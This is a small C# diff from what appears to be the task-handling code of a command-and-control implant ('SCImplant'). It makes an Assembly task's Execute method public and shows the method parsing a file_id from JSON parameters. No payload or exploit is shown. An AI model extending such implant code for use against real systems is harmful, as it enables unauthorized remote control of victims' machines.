@@ -6,7 +6,7 @@ namespace SaltedCaramel.Tasks
 {
     class Assembly
     {
-        internal static void Execute(SCTaskObject task, SCImplant implant)
+        public static void Execute(SCTaskObject task, SCImplant implant)
         {
             JObject json = (JObject)JsonConvert.DeserializeObject(task.@params);
             string file_id = json.Value<string>("file_id");
